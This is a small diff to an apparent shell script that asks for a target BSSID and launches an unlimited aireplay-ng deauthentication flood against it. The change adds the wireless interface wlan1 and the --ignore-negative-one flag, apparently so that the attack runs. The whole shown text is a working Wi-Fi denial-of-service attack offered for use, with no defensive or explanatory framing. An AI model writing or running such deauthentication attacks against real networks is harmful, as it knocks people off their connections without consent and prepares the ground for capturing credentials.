@@ -3,4 +3,4 @@
 echo "Deaut Target"
 read -p "BSSID : " bssid;
 sleep 2
-aireplay-ng --deauth 0 -a $bssid
+aireplay-ng --deauth 0 -a $bssid wlan1 --ignore-negative-one
